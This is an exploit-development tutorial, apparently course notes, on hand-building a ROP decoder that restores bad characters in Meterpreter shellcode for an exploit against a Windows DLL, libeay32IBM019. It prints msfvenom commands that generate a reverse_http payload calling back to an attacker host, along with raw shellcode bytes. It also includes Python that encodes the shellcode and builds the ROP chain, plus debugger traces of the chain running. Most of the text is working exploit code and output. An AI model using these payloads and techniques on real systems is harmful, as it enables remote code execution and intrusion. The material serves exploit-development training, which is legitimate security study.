# Problem
The problem is that we generated a shellcode with msfvenom that avoid several badchars:
```C
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Encoding failed due to a bad character (index=667, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 714 (iteration=0)
x86/call4_dword_xor chosen with final size 714
Payload size: 714 bytes
Final size of python file: 3978 bytes
shellcode =  b""
shellcode += b"\x33\xc9\x66\x81\xe9\x54\xff\xe8\xff\xff\xff"
shellcode += b"\xff\xc0\x5e\x81\x76\x0e\xa4\x94\xf7\xb3\x83"
shellcode += b"\xee\xfc\xe2\xf4\x58\x7c\x78\xb3\xa4\x94\x97"
shellcode += b"\x82\x76\x1d\x12\xd7\x2f\xc6\xc7\x38\xf6\x98"
shellcode += b"\x7c\xe1\xb0\x9b\x40\xf9\x82\x1f\x85\x9b\x95"
shellcode += b"\x6b\xc6\x73\x08\xa8\x96\xcf\xa6\xb8\xd7\x72"
shellcode += b"\x6b\x99\xf6\x74\xed\xe1\x18\xe1\xf3\x1f\xa5"
shellcode += b"\xa3\x2f\xd6\xcb\xb2\x74\x1f\xb7\xcb\x21\x54"
```

This shellcode has several instructions that try to "decode" its own code in order to replace some bytes for other bytes (let's say it's trying to restore itself). For that, it needs to write in the address where it is stored, giving us an error when the codecave does not have write permissions, which is the case:
```c
0:085> g (1a54.fe8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bb2c04 ebx=05ebc5b0 ecx=0000008d edx=1860bbcc esi=42424242 edi=00669360 eip=01bb2c14 esp=1111e30c ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 
libeay32IBM019!N98E_bn_sub_words+0x108c:
01bb2c14 31501a xor dword ptr [eax+1Ah],edx ds:0023:01bb2c1e=9a884739
```

At this point, we know we need to avoid bad characters in our shellcode and can not rely on the msfvenom decoder. 
In this section, we’ll learn how to manually implement a ROP decoder and test it.

# Step 1.  Find replacement alternatives
First, let’s replace the bad characters with safe alternatives that will not break the exploit. To begin, we’ll select arbitrary replacement characters for our badchars:
```c
0x00 -> 0xff 
0x09 -> 0x10 
0x0a -> 0x06 
0x0b -> 0x07 
0x0c -> 0x08 
0x0d -> 0x05 
0x20 -> 0x1f
```

To implement this technique, we’ll first generate a windows/meterpreter/reverse_http payload in Python format (**without encoding it**):
```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 579 bytes
Final size of python file: 3234 bytes
shellcode =  b""
shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
shellcode += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x89\xe5\x31"
[...]
```

After that, we create two Python functions that:
1. Detect the badchars (returning the array containing the index of the badchars inside the shellcode).
2. Replace the badchars for our byte replacements.

This leverages us with an encoded shellcode:
```python
from struct import pack

def mapBadChars(sh):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20" # Replace for your badchars  
    i = 0
    badIndex = []
    while i < len(sh):
        for c in BADCHARS:
            if sh[i] == c:
                badIndex.append(i)
        i=i+1
    return badIndex

def encodeShellcode(sh):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
    encodedShell = sh
    for i in range(len(BADCHARS)):
        encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
    return encodedShell

shellcode =  b""
shellcode += b"\x2b\xc9\x66\x81\xe9\x6d\xff\xe8\xff\xff\xff"
shellcode += b"\xff\xc0\x5e\x81\x76\x0e\x8d\xb0\x1d\xfd\x83"
shellcode += b"\xee\xfc\xe2\xf4\x71\x58\x92\xfd\x8d\xb0\x7d"
shellcode += b"\x74\x68\x81\xcf\x99\x06\xe2\x2d\x76\xdf\xbc"
shellcode += b"\x96\xaf\x99\xbf\xaa\xb7\xab\x81\xe2\x76\xff"

badchars = mapBadChars(shellcode)
encodedShellcode = encodeShellcode(shellcode)
```

Now we have to decode it.


# Step 2. Get a pointer to the start of our shellcode
As previously mentioned, at this point of the ROP chain execution, EAX contains the stack address of nSize.
First of all, we we must determine the negative offset from the stack address pointing to nSize (this pointer is available to us after perfoming all the ROP chain in EAX) **to the first character of the shellcode**.
This calculation is tricky, so we will do it dinamically by doing a substraction.
After substracting, we find that the offset is -**1563** bytes, so we need to substract such quantity to EAX to align it to the start of the shellcode.
```
# Align EAX with shellcode
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xfffff9e5))
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
```

# Step 3. Generate a ROP chain to fix each of the badchars.
Now that we have aligned EAX with the beginning of the shellcode, we need to create a method that dynamically adds a ROP chain for each bad character.
The **generic rop chain prototype that we will use to fix each of the badchars is the following:**
```python
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (offset to next bad characters))
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (value to add)) # values in BH
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret
```

For each of these ROP chains, our code must calculate the offset from the previous bad character to the next. It must also ensure that the offset is popped into ECX, as highlighted in the listing above (“offset to next bad characters”).
Because the value is subtracted from EAX, we’ll need to use its negative counterpart (to add instead of substracting as we are going to higher directions in the stack-remember how shellcode is stored).

We also need to add a value to the replacement character to restore the original bad character. We’ll place this value into the second highlighted section from the prototype ROP gadget.
We must keep in mind that the **value popped in EBX cannot contain a bad character**, and only the byte in **BH** (bytes 8 to 16) is used in the restore action.

So, if this is our conversion:
```c
0x00 -> 0xff 
0x09 -> 0x10 
0x0a -> 0x06 
0x0b -> 0x07 
0x0c -> 0x08 
0x0d -> 0x05 
0x20 -> 0x1f
```

We can do simple math to know the bytes we need to add to restore the original characters:
```c
0x01 + 0xff = 0x00 
0xf9 + 0x10 = 0x09 
0x04 + 0x06 = 0x0a 
0x04 + 0x07 = 0x0b 
0x04 + 0x08 = 0x0c
0x08 + 0x05 = 0x0d
0x01 + 0x1f = 0x20
```

Once we have this information, we can generate a script that, for each of the badchars in our shellcode, adds a prototyped ROP chain with the corresponding offset and the value to add. This function will require three arguments; the base address of libeay32IBM019, the indexes of the bad characters in the shellcode, and the unencoded shellcode.

This is the function that performs the ROP chain creation automatically:
```python
def decodeShellcode(dllBase, badIndex, shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
    restoreRop = b""

    for i in range(len(badIndex)):
        
        if i == 0:
            offset = badIndex[i]
        else:
            offset = badIndex[i] - badIndex[i-1]

        neg_offset = (-offset) & 0xffffffff
        value = 0

        for j in range(len(BADCHARS)):
            if shellcode[badIndex[i]] == BADCHARS[j]:
                value = CHARSTOADD[j]

        value = (value << 8) | 0x11110011

        restoreRop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
        restoreRop += pack("<L", (neg_offset))
        restoreRop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
        restoreRop += pack("<L", (value)) # values in BH
        restoreRop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret

    return restoreRop
```

First we’ll list the possible bad characters and the associated characters we want to add. 
Next, we can create an accumulator variable (restoreRop) that will contain the entire decoding ROP chain.
Next, we need to perform a loop over all the bad character indexes. 
For each entry, we’ll calculate the offset from the previous bad character to the current bad character. 
This offset **is negated** and assigned to the neg_offset variable and used in the ROP chain for the POP ECX instruction.
To determine the value to add to the replacement character, we can perform a nested loop over all possible bad characters to determine which one was present at the corresponding index. Once the value is found, it is stored in the value variable.
Since the contents of value must be popped into BH, we have to **left-shift it by 8 bits.**
This will produce a value that is **aligned with the BH register but contains NULL bytes**. To solve the NULL byte problem, we will perform an OR operation with the static value 0x11110011, so that "11" bits are in the rest of RBX.
Finally, the result is written to the ROP chain where it will be popped into EBX at runtime.

We can just add the rop chain like this by calling the "decodeShellcode" method at runtime:
```
rop += decodeShellcode(dllBaseAddress, badIndexArray, shellcode)
```

If we apply the decoding operation via ROP gadgets to the shellcode and put a breakpoint before the first ROP gadget, we can see that we are aligning EAX with the beginning of the shellcode (minus one byte, to account for the offset in the write gadget) and patching the bytes: 
```c
0:079> bp libeay32IBM019+0x4a7b6
0:079> g
Breakpoint 0 hit
eax=0d55e2f0 ebx=05d03380 ecx=fffff9e5 edx=77992da0 esi=42424242 edi=00669360
eip=02fea7b6 esp=0d55e39c ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x386:
02fea7b6 2bc1            sub     eax,ecx
0:081> p
eax=0d55e90b ebx=05d03380 ecx=fffff9e5 edx=77992da0 esi=42424242 edi=00669360
eip=02fea7b8 esp=0d55e39c ebp=41414141 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
libeay32IBM019!N98E_BIO_f_cipher+0x388:
02fea7b8 5b              pop     ebx
0:081> db eax L10
0d55e90b  43 fc e8 8f ff ff ff 60-31 d2 89 e5 64 8b 52 30  C......`1...d.R0
0:081> g
Breakpoint 0 hit
eax=0d55e90b ebx=42424242 ecx=fffffffd edx=77992da0 esi=42424242 edi=00669360
eip=02fea7b6 esp=0d55e3ac ebp=41414141 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
libeay32IBM019!N98E_BIO_f_cipher+0x386:
02fea7b6 2bc1            sub     eax,ecx
0:081> p
eax=0d55e90e ebx=42424242 ecx=fffffffd edx=77992da0 esi=42424242 edi=00669360
eip=02fea7b8 esp=0d55e3ac ebp=41414141 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
libeay32IBM019!N98E_BIO_f_cipher+0x388:
02fea7b8 5b              pop     ebx
0:081> db eax L10
0d55e90e  8f ff ff ff 60 31 d2 89-e5 64 8b 52 30 8b 52 08  ....`1...d.R0.R.
0:081> p
eax=0d55e90e ebx=11110111 ecx=fffffffd edx=77992da0 esi=42424242 edi=00669360
eip=02fea7b9 esp=0d55e3b0 ebp=41414141 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
libeay32IBM019!N98E_BIO_f_cipher+0x389:
02fea7b9 c3              ret
0:081> p
eax=0d55e90e ebx=11110111 ecx=fffffffd edx=77992da0 esi=42424242 edi=00669360
eip=02fe68ee esp=0d55e3b4 ebp=41414141 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
02fe68ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:0d55e90f=ff
0:081> p
eax=0d55e90e ebx=11110111 ecx=fffffffd edx=77992da0 esi=42424242 edi=00669360
eip=02fe68f4 esp=0d55e3b4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
02fe68f4 c3              ret
0:081> db eax L10
0d55e90e  8f 00 ff ff 60 31 d2 89-e5 64 8b 52 30 8b 52 08  ....`1...d.R0.R.
```

In the previous section we see how the "ff" badchar byte gets dinamically replaced for "00". This process is done iteratively, until all the badchars are fixed.

